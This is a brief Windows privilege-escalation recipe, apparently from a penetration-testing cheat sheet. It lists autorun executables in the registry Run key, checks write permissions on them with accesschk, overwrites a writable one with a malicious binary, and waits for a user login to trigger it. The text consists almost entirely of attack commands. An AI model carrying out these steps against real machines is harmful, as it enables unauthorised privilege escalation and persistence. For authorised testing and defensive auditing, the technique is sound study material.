First, get paths of all autoruns:
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Then, check for priveleges:
```
accesschk.exe /accepteula -wvu EXECUTABLE_PATH
```

If you have `RW` access, overwrite the executable:
```
copy MALICIOUS_FULL_PATH ORIGINAL_FULL_PATH
```

To run the exploit, log in (new RDP session / relog / wait for someone else to log in)
